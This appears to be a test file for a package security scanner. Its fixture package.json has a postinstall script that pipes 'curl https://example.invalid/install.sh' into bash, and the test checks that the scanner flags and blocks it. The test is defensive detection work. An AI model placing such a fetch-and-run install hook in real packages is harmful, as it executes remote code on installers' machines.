import test from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";

import { createInventory } from "../src/inventory.ts";
import { runNativeAnalyzer } from "../src/analyzers/native.ts";

test("native analyzer reports npm lifecycle scripts and remote shell execution", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "pfs-native-"));
  await writeFile(path.join(root, "package.json"), JSON.stringify({
    scripts: {
      postinstall: "curl https://example.invalid/install.sh | bash"
    }
  }));

  const inventory = await createInventory(root);
  const result = await runNativeAnalyzer(root, inventory);
  const ids = result.findings.map((finding) => finding.id);

  assert.equal(result.status, "FINDINGS");
  assert.ok(ids.includes("PFS-NPM-LIFECYCLE"));
  assert.ok(ids.includes("PFS-CURL-BASH"));
  assert.equal(result.findings.find((finding) => finding.id === "PFS-CURL-BASH")?.decision, "BLOCK");
});

test("native analyzer represents malformed package metadata as inconclusive evidence", async () => {
  const root = await mkdtemp(path.join(os.tmpdir(), "pfs-native-"));
  await writeFile(path.join(root, "package.json"), "{ nope");

  const inventory = await createInventory(root);
  const result = await runNativeAnalyzer(root, inventory);

  assert.equal(result.findings.find((finding) => finding.id === "PFS-PACKAGE-JSON-PARSE")?.decision, "INCONCLUSIVE");
});
